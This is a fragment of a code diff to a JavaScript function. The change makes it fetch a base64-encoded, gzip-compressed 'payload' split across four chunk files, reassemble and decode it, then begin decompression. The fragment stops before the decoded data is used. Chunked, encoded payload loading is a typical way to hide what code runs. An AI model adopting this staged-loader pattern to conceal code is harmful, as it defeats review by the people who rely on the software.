@@ -1,7 +1,11 @@
 (async () => {
   try {
-    const raw = await (await fetch("./payload.txt")).text();
-    const b64 = raw.replace(/\s+/g, "");
+    const parts = [];
+    for (let i = 0; i < 4; i++) {
+      const r = await fetch("./c" + i + ".txt");
+      parts.push(await r.text());
+    }
+    const b64 = parts.join("").replace(/\s+/g, "");
     const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
     const ds = new DecompressionStream("gzip");
     const stream = new Response(bin).body.pipeThrough(ds);
